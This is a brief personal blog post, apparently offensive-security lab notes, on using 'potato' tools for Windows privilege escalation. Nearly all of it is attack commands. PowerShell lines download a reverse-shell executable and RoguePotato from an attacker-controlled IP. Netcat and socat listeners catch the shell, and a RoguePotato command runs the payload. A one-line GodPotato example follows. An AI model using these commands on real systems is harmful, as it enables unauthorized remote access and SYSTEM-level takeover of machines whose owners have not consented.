---
layout: post
title: Potatoes
titledate: 10/17/23
tags: ["infosec","offsec","potatoes", "privesc", "powershell"]
---

There are many potatoes that can be used for privesc, and i'll include how i've used them below

#### rogue

i copy the potato along with a reverse shell to the target exec directory

    PS> iwr -uri http://192.168.45.215:8000/rs443.exe -Outfile rs443.exe
    PS> iwr -uri http://192.168.45.215:8000/RoguePotato.exe -Outfile rogue.exe

open up a nc listener

    nc -nlvp 443

    socat tcp-listen:135,reuseaddr,fork tcp:192.168.221.247:9999

on the target shell

    .\rogue.exe -r 192.168.45.215 -e "C:\Users\jim\Downloads\rs443.exe" -l 9999

#### God

    GodPotato -cmd "cmd /c whoami"